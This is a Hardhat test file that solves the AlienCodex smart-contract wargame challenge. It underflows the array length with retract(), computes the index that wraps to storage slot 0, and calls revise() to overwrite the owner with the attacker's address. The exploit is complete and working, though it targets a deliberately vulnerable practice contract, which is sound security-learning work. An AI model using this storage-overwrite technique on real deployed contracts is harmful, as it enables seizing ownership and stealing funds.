import { expect } from "chai";
import { ethers } from "hardhat";
const { BigNumber } = ethers
const { hexZeroPad, keccak256, hexlify } = ethers.utils
describe("AlienCodex", async function () {

  it("Should become the owner", async function () {
    const [deplyer, attacker] = await ethers.getSigners()
    const AlienCodex = await ethers.getContractFactory("AlienCodex");
    const alienCodex = await AlienCodex.deploy();
    await alienCodex.deployed();

    //1.Call make contact
    await alienCodex.connect(attacker).make_contact();

    //2. Call retract() to be able to access any array position.
    await alienCodex.connect(attacker).retract();

    //3.Find out the array position hash to access position 0x01
    //storage position hash + ? = hexlify("0x01" + "0".repeat(64))(using underflow) => 0x01
    let hash = BigNumber.from(keccak256(hexZeroPad("0x1", 32)))
    const max32BytesPlus1 = hexlify("0x01" + "0".repeat(64))
    hash = BigNumber.from(max32BytesPlus1).sub(hash)
    //console.log(hash.toHexString())
    //4.Call revise to set the attakcer address as the owner
    await alienCodex.connect(attacker).revise(hash, hexZeroPad(attacker.address, 32))
    // const storage0 = await ethers.provider.getStorageAt(alienCodex.address, 0)
    expect(await alienCodex.owner()).to.eq(attacker.address)
  });
});

